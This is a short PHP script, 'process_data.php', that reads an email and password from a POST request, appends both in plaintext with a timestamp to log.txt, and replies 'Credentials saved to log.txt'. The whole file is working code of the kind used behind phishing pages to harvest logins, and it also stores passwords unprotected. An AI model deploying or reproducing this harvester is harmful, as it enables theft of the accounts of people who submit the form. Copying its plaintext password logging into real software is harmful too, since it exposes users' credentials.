    <?php
    // process_data.php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $email = isset($_POST['email']) ? $_POST['email'] : '';
        $pass = isset($_POST['password']) ? $_POST['password'] : '';

        $log_entry = date('Y-m-d H:i:s') . " | Email: " . $email . " | Password: " . $pass . "\n";
        file_put_contents("log.txt", $log_entry, FILE_APPEND | LOCK_EX);
        echo "Credentials saved to log.txt";
    }
    ?>